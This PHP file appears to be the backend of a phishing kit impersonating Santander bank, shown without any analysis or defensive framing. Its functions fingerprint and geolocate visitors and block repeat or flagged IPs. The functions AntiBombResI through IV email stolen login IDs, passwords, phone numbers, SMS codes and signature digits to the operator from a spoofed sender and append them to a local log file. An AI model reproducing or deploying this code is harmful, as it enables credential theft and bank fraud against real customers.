<?php

/* 
* Redirect Function
*/function rediret($link){
		header('Location: '.$link);
		exit();
	}

/* 
 * Get User Agent IP Function
*/function _user(){
		if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
			$adresse = getenv("HTTP_CLIENT_IP");
		else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
			$adresse = getenv("HTTP_X_FORWARDED_FOR");
		else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
			$adresse = getenv("REMOTE_ADDR");
		else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
			$adresse = $_SERVER['REMOTE_ADDR'];
		else
			$adresse = "";
		return($adresse);
	}

	function AntiBomb_OS($referer){
	    $array_os = [ 'windows nt 10' =>'Windows 10', 'windows nt 6.3' => 'Windows 8.1', 'windows nt 6.2' => 'Windows 8', 'windows nt 6.1|windows nt 7.0' => 'Windows 7', 'windows nt 6.0' => 'Windows Vista', 'windows nt 5.2' => 'Windows Server 2003/XP x64', 'windows nt 5.1' => 'Windows XP', 'windows xp' => 'Windows XP', 'windows nt 5.0|windows nt5.1|windows 2000' => 'Windows 2000', 'windows me' => 'Windows ME', 'windows nt 4.0|winnt4.0' => 'Windows NT', 'windows ce' => 'Windows CE', 'windows 98|win98' => 'Windows 98', 'windows 95|win95' => 'Windows 95', 'win16' => 'Windows 3.11', 'mac os x 10.1[^0-9]' => 'Mac OS X Puma', 'macintosh|mac os x' => 'Mac OS X', 'mac_powerpc' => 'Mac OS 9', 'linux' => 'Linux', 'ubuntu' => 'Linux - Ubuntu', 'iphone' => 'iPhone', 'ipod' => 'iPod', 'ipad' => 'iPad', 'android' => 'Android', 'blackberry' => 'BlackBerry', 'webos' => 'Mobile', '(media center pc).([0-9]{1,2}\.[0-9]{1,2})'=>'Windows Media Center', '(win)([0-9]{1,2}\.[0-9x]{1,2})'=>'Windows', '(win)([0-9]{2})'=>'Windows', '(windows)([0-9x]{2})'=>'Windows', 'Win 9x 4.90'=>'Windows ME', '(windows)([0-9]{1,2}\.[0-9]{1,2})'=>'Windows', 'win32'=>'Windows', '(java)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2})'=>'Java', '(Solaris)([0-9]{1,2}\.[0-9x]{1,2}){0,1}'=>'Solaris', 'dos x86'=>'DOS', 'Mac OS X'=>'Mac OS X', 'Mac_PowerPC'=>'Macintosh PowerPC', '(mac|Macintosh)'=>'Mac OS', '(sunos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'SunOS', '(beos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'BeOS', '(risc os)([0-9]{1,2}\.[0-9]{1,2})'=>'RISC OS', 'unix'=>'Unix', 'os/2'=>'OS/2', 'freebsd'=>'FreeBSD', 'openbsd'=>'OpenBSD', 'netbsd'=>'NetBSD', 'irix'=>'IRIX', 'plan9'=>'Plan9', 'osf'=>'OSF', 'aix'=>'AIX', 'GNU Hurd'=>'GNU Hurd', '(fedora)'=>'Linux - Fedora', '(kubuntu)'=>'Linux - Kubuntu', '(ubuntu)'=>'Linux - Ubuntu', '(debian)'=>'Linux - Debian', '(CentOS)'=>'Linux - CentOS', '(Mandriva).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - Mandriva', '(SUSE).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - SUSE', '(Dropline)'=>'Linux - Slackware (Dropline GNOME)', '(ASPLinux)'=>'Linux - ASPLinux', '(Red Hat)'=>'Linux - Red Hat', '(linux)'=>'Linux', '(amigaos)([0-9]{1,2}\.[0-9]{1,2})'=>'AmigaOS', 'amiga-aweb'=>'AmigaOS', 'amiga'=>'Amiga', 'AvantGo'=>'PalmOS', '[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3})'=>'Linux', '(webtv)/([0-9]{1,2}\.[0-9]{1,2})'=>'WebTV', 'Dreamcast'=>'Dreamcast OS', 'GetRight'=>'Windows', 'go!zilla'=>'Windows', 'gozilla'=>'Windows', 'gulliver'=>'Windows', 'ia archiver'=>'Windows', 'NetPositive'=>'Windows', 'mass downloader'=>'Windows', 'microsoft'=>'Windows', 'offline explorer'=>'Windows', 'teleport'=>'Windows', 'web downloader'=>'Windows', 'webcapture'=>'Windows', 'webcollage'=>'Windows', 'webcopier'=>'Windows', 'webstripper'=>'Windows', 'webzip'=>'Windows', 'wget'=>'Windows', 'Java'=>'Unknown', 'flashget'=>'Windows', 'MS FrontPage'=>'Windows', '(msproxy)/([0-9]{1,2}.[0-9]{1,2})'=>'Windows', '(msie)([0-9]{1,2}.[0-9]{1,2})'=>'Windows', 'libwww-perl'=>'Unix', 'UP.Browser'=>'Windows CE', 'NetAnts'=>'Windows','IEMobile' => 'Windows Mobile',
	    ];
	    $arch_regex = '/\b(x86_64|x86-64|Win64|WOW64|x64|ia64|amd64|ppc64|sparc64|IRIX64)\b/ix';
	    $arch = preg_match($arch_regex, $referer) ? '64' : '32';
	    foreach ($array_os as $regex => $value) {
	        if (preg_match('{\b('.$regex.')\b}i', $referer)) {
	            return $value.' x'.$arch;
	        }
	    }
	    return 'Unknown';
	}

	function AntiBomb_Brow($referer){
		$infos=$referer;
		if (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'opr/')) { $version='Opera'; }
		elseif (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'chrome/')) { $version='Chrome'; }
		elseif (strpos(strtolower($infos), 'msie')) { $version='Internet Explorer'; }
		elseif (strpos(strtolower($infos), 'firefox/')) { $version='Firefox'; }
		elseif (strpos(strtolower($infos), 'safari/') and strpos(strtolower($infos), 'opr/')==false and strpos(strtolower($infos), 'chrome/')==false) { $version='Safari'; }
		else { $version='OUT OF DATA'; };
		return $version;
	}
	function _AntiBomb_User($user){
		$user_list = @fopen("./particulares/data/logs/7daya.txt","a+");
		fwrite($user_list,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user."\r\n");
		fclose($user_list);
	}

	function _AntiBomb_Block($user){
		$user_block = @fopen("./data/logs/AntiBomb_Block.txt","a+");
		fwrite($user_block,"[".$_SESSION['code']."] => ".date('D - H:i:s')." -> ".$user."\r\n");
		fclose($user_block);
	}

	function AntiBomb_User($user){
        global $count;
        $lisnC  = @fopen("./particulares/data/logs/7daya.txt", "r");
        if ($lisnC)
        {
            while (!feof($lisnC))
            {
                $buffer = fgets($lisnC);
                if(strpos($buffer, $user) !== FALSE) $count ++;
                if($count === 5){
                    return true;
                    break;
                }
            }
            fclose($lisnC);
        }
    }

	function AntiBomb_Block($user){
        global $block;
        $listB  = @fopen("./particulares/data/logs/AntiBomb_Block.txt", "r");
        if ($listB)
        {
            while (!feof($listB))
            {
                $buffer = fgets($listB);
                if(strpos($buffer, $user) !== FALSE) $block ++;
                if($block === 1){
                    return true;
                    break;
                }
            }
            fclose($listB);
        }
    }
	function getLocation($user){
		$init = curl_init();
		curl_setopt_array($init, array(
			CURLOPT_URL				=> "http://www.geoplugin.net/json.gp?ip=".$user,
			CURLOPT_HEADER			=> 0,
			CURLOPT_RETURNTRANSFER	=> TRUE
			));
		$details = curl_exec($init); // string
		curl_close($init);
		$location = json_decode($details);
		$_SESSION['country'] =  strtoupper($location->geoplugin_countryName);
		$_SESSION['code'] =  $location->geoplugin_countryCode;
	}
	function AntiBombResI($to, $pnl, $type, $Uid, $Pid, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			// <font style='color: grey;'>E-Name ¨ SANTANDER ¨ TΔkerz™</font>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> PANEL   : <span style='color:#0070ba;'>".$pnl."</span>
			<font style='color:grey'>[+]</font> TYPE    : <span style='color:#0070ba;'>".$type."</span>
			<font style='color:grey'>[+]</font> LOGE    : <span style='color:#0070ba;'>".$Uid."</span>
			<font style='color:grey'>[+]</font> PASS    : <span style='color:#0070ba;'>".$Pid."</span>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> SYSTEME : <span style='color:#0070ba;'>".AntiBomb_OS($referer)."</span>
			<font style='color:grey'>[+]</font> BROWSER : <span style='color:#0070ba;'>".$referer."</span>
			<font style='color:grey'>[+]</font> IP INFO : <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".$user."' target='_blank'>`[ ".$_SESSION['country']." ] => ".$user."</a>
			//<font style='color:black;'>------------------------------ Lkhous</font>
			</pre></section></body></html>
			\n";
					$subj  = "SANT-ANDER / LOG FROM =?UTF-8?Q?=e2=9d=a4_?= ".$user." =?UTF-8?Q?=E2=9C=94_?= ";
					$head  = "From: Lkhous™<lalhost@moneySquad.org>\r\n";
					$head .= "MIME-Version: 1.0\r\n";
					$head .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
					@mail($to, $subj, $mail, $head);
		        	$text .= "// login SANTANDER\n"; 
					$text .= "[+] PANEL_1    :  " .$pnl."\n";
					$text .= "[+] TYPE_1     :  " .$type."\n";
					$text .= "[+] LOGE_1     :  " .$Uid."\n";
					$text .= "[+] PASS_1     :  " .$Pid."\n";
		        	$text .= "// -------------------------------\n"; 
					$text .= "[+] SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "[+] BROWSER    :  " .$referer."\n";
					$text .= "[+] IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
		        	$text .= "// --------------------------------\n";
					$text .= "\n";
					$text .= "\n";
					$text .= "\n";
					$result = @fopen("./data/logs/STOCk.txt", "a+");   
					fwrite($result, $text);
		}

	function AntiBombResII($to, $telef, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			// <font style='color: grey;'>Numero ¨ SANTANDER ¨ TΔkerz™</font>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> Tele Movil   : <span style='color:#0070ba;'>" .$telef."</span>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> SYSTEME : <span style='color:#0070ba;'>".AntiBomb_OS($referer)."</span>
			<font style='color:grey'>[+]</font> BROWSER : <span style='color:#0070ba;'>".$referer."</span>
			<font style='color:grey'>[+]</font> IP INFO : <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".$user."' target='_blank'>`[ ".$_SESSION['country']." ] => ".$user."</a>
			//<font style='color:black;'>------------------------------ Lkhous</font>
			</pre></section></body></html>
				\n";
					$subj  = "SANT-ANDER / TELEF FROM =?UTF-8?Q?=e2=9d=a4_?= ".$user." =?UTF-8?Q?=E2=9C=94_?= ";
					$head  = "From: Lkhous™<localhost@moneySquad.org>\r\n";
					$head .= "MIME-Version: 1.0\r\n";
					$head .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
					@mail($to, $subj, $mail, $head);
		        	$text  = "// Namra d SANTANDER\n";
					$text .= "|TELEF      :  " .$telef."\n";
		        	$text .= "// -------------------------------\n"; 
					$text .= "[+] SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "[+] BROWSER    :  " .$referer."\n";
					$text .= "[+] IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
		        	$text .= "// --------------------------------\n";
		        	$text .= "// --------------------------------\n";
					$text .= "\n";
					$text .= "\n";
					$text .= "\n";
					$result = @fopen("./data/logs/STOCk.txt", "a+");   
					fwrite($result, $text);
		}

	function AntiBombResIII($to, $sms, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			// <font style='color: grey;'>FIRMA ¨ SANTANDER ¨ TΔkerz™</font>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> sms   : <span style='color:#0070ba;'>" .$sms."-*-".$k02."-".$k03."-*-".$k04."</span>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> SYSTEME : <span style='color:#0070ba;'>".AntiBomb_OS($referer)."</span>
			<font style='color:grey'>[+]</font> BROWSER : <span style='color:#0070ba;'>".$referer."</span>
			<font style='color:grey'>[+]</font> IP INFO : <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".$user."' target='_blank'>`[ ".$_SESSION['country']." ] => ".$user."</a>
			//<font style='color:black;'>------------------------------ Lkhous</font>
			</pre></section></body></html>";
					$subj  = "SANT-ANDER / SMS FROM =?UTF-8?Q?=e2=9d=a4_?= ".$user." =?UTF-8?Q?=E2=9C=94_?= ";
					$head  = "From: Lkhous™<localhost@moneySquad.org>\r\n";
					$head .= "MIME-Version: 1.0\r\n";
					$head .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
					@mail($to, $subj, $mail, $head);
		        	$text  = "// Sms SANTANDER\n"; 
					$text .= "|SMS   1     :  " .$sms."\n";
		        	$text .= "// -------------------------------\n"; 
					$text .= "[+] SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "[+] BROWSER    :  " .$referer."\n";
					$text .= "[+] IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
		        	$text .= "// --------------------------------\n";
					$text .= "\n";
					$text .= "\n";
					$text .= "\n";
					$result = @fopen("./data/logs/STOCk.txt", "a+");   
					fwrite($result, $text);
		}

	function AntiBombResIV($to, $k1, $k2, $k3, $k4, $k5, $k6, $k7, $k8, $tel01, $user, $referer, $text = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			// <font style='color: grey;'>FIRMA B Numero ¨ SANTANDER ¨ TΔkerz™</font>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> Tele   : <span style='color:#0070ba;'>" .$tel01."</span>
			<font style='color:grey'>[+]</font> FIRMA  : <span style='color:#0070ba;'>" .$k1."-".$k2."-".$k3."-".$k4."-".$k5."-".$k6."-".$k7."-".$k8."</span>
			//<font style='color:black;'>------------------------------</font>
			<font style='color:grey'>[+]</font> SYSTEME : <span style='color:#0070ba;'>".AntiBomb_OS($referer)."</span>
			<font style='color:grey'>[+]</font> BROWSER : <span style='color:#0070ba;'>".$referer."</span>
			<font style='color:grey'>[+]</font> IP INFO : <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".$user."' target='_blank'>`[ ".$_SESSION['country']." ] => ".$user."</a>
			//<font style='color:black;'>------------------------------ Lkhous</font>
			</pre></section></body></html>";
					$subj  = "SANT-ANDER / FIRMA2 FROM =?UTF-8?Q?=e2=9d=a4_?= ".$user." =?UTF-8?Q?=E2=9C=94_?= ";
					$head  = "From: Lkhous™<localhost@moneySquad.org>\r\n";
					$head .= "MIME-Version: 1.0\r\n";
					$head .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
					@mail($to, $subj, $mail, $head);
		        	$text  = "// FIRMA AND NUMBER SANTANDER\n";
					$text .= "| FIRMA2     :  " .$k1."-".$k2."-".$k3."-".$k4."-".$k5."-".$k6."-".$k7."-".$k8."\n";
					$text .= "| TELEF      :  " .$tel01."\n";
		        	$text .= "// -------------------------------\n"; 
					$text .= "[+] SYSTEME    :  " .AntiBomb_OS($referer)."\n";
					$text .= "[+] BROWSER    :  " .$referer."\n";
					$text .= "[+] IP         :  [".$_SESSION['country']."] => ".date('D - d-m-Y - H:i:s')." -> ".$user."\n";
		        	$text .= "// --------------------------------\n";
					$text .= "\n";
					$text .= "\n";
					$text .= "\n";
					$result = @fopen("./data/logs/STOCk.txt", "a+");   
					fwrite($result, $text);
		}




?>